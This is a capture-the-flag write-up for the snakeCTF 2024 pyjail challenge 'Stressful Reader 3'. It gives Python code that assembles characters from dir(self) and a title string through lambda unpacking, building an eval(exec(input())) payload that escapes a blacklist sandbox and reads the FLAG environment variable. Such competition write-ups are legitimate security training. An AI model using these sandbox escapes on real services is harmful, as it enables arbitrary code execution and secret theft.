# Stressful Reader 3 [_snakeCTF 2024 Quals_]

**Category**: Misc

## Description

OMG this is a nightmare! Something has changed again! Will it be easier this time?

## Solution

Something has changed again, and the journey with pyjails continues.

By analysing the jail code, the first things that can be noticed:

1. There is no `get_var` function to directly read an env variable like it was done in Stressful Reader 2
2. The variable `self.title` now includes the string `(now with refactored code!)` which can become useful to extract some characters that previously were not available, more specifically `(` and `)`

By running `diff`, it can also be seen that now the `eval` keyword is not blacklisted any more, so it can be surely used in the payload.

The goal then is to send `eval(something)` where `something` has to be written by using the `lambda` trick used in the solution of Stressful Reader 2.

This `something` can be for example `exec(input())`, so after its execution it is possible to send an arbitrary payload like `import os; print(os.getenv('FLAG'))`.

The only thing to do now is to build a convenience function to extract the `input()` string from `dir(self)` and `self.title`, which can be done in the following way:

```python
title = r"                    (now with refactored code!)"

left_parentheses_idx = title.find("(")
right_parentheses_idx = title.find(")")

def get_left_parentheses():
    global left_parentheses_idx
    return f"(lambda {','.join(title)}: {title[left_parentheses_idx]})(*self.title)"

def get_right_parentheses():
    global right_parentheses_idx
    return f"(lambda {','.join(title)}: {title[right_parentheses_idx]})(*self.title)"


def get_both_parentheses():
    global left_parentheses_idx, right_parentheses_idx
    return f"(lambda {','.join(title)}: {title[left_parentheses_idx]} + {title[right_parentheses_idx]})(*self.title)"

def get_exec():
    # __delattr__ for 'e' -> 1st
    # __reduce_ex__ for 'x' -> 20
    # __delattr__ for 'e' -> 1st
    # __class__ for 'c' -> 0th
    global params
    delattr = get_param_names("__delattr__")
    reduce_ex = get_param_names("__reduce_ex__")
    class_ = get_param_names("__class__")
    return (
        f"(lambda {','.join(params)} : "
        + f"(lambda {','.join(delattr)}: {delattr[3]})(*{params[1]}) + "
        + f"(lambda {','.join(reduce_ex)}: {reduce_ex[10]})(*{params[20]}) + "
        + f"(lambda {','.join(delattr)}: {delattr[3]})(*{params[1]}) + "
        + f"(lambda {','.join(class_)}: {class_[2]})(*{params[0]}))"
        + "(*dir(self))"
    )


def get_input():
    # we want to send 'input()'
    # __init__ for 'in' -> 12th entry (from 0) in dir(self)
    # __repr__ for 'p' -> 21th entry (from 0) in dir(self)
    # __getattribute__ for 'ut' -> 8th entry (from 0) in dir(self)
    global params
    init = get_param_names("__init__")
    repr = get_param_names("__repr__")
    getattribute = get_param_names("__getattribute__")
    return (
        f"(lambda {','.join(params)} : "
        + f"(lambda {','.join(init)}: {init[2]} + {init[3]})(*{params[12]}) + "
        + f"(lambda {','.join(repr)}: {repr[4]})(*{params[21]}) + "
        + f"(lambda {','.join(getattribute)}: {getattribute[11]} + {getattribute[12]})(*{params[8]}))(*dir(self))"
    )

```

And finally the payload to send can be composed by using the functions that were just defined:

```python
payload = (
    "eval("
    + "+".join(
        [
            get_exec(),
            get_left_parentheses(),
            get_input(),
            get_both_parentheses(),
            get_right_parentheses(),
        ]
    )
    + ")"
)
```
